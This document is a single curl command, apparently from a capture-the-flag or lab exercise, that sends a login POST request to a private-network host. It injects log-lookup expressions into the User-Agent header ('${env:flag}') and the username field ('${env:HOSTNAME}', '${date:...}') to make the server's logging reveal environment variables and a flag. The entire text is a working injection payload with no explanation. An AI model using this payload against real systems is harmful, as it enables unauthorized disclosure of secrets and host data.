curl -v 'http://172.25.0.21:39110/login' -X POST \
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) ${env:flag}' \
--data-raw 'uname=req+at+%24%7Bdate%3AMM-dd-yyyy%7D+sys+running+on+%24%7Benv%3AHOSTNAME%7D.&password='